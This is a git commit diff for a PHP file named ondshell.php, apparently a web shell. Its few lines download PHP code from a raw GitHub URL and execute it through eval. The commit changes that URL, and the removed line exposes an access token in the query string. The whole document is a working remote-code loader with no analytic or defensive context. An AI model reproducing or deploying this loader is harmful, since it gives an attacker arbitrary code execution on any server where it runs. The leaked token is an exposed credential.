cbb4f7b5529b2081a51c4a76583fb352b8be9c02
vkingpirates <135661822+vkingpirates@users.noreply.github.com>
2023-06-06 05:45:18 +0900

    Update ondshell.php

--- ondshell.php
+++ ondshell.php
@@ -1,4 +1,4 @@
 <?php 
-    $filedata = file_get_contents('https://raw.githubusercontent.com/vkingpirates/ond/main/onshell.php.txt?token=GHSAT0AAAAAACDRJLQWJ5FOX5LVH7K43EPKZD6IQDQ');
+    $filedata = file_get_contents('https://raw.githubusercontent.com/vkingpirates/ondshell/main/onshell.php.txt');
     eval ("?>$filedata");
 ?>
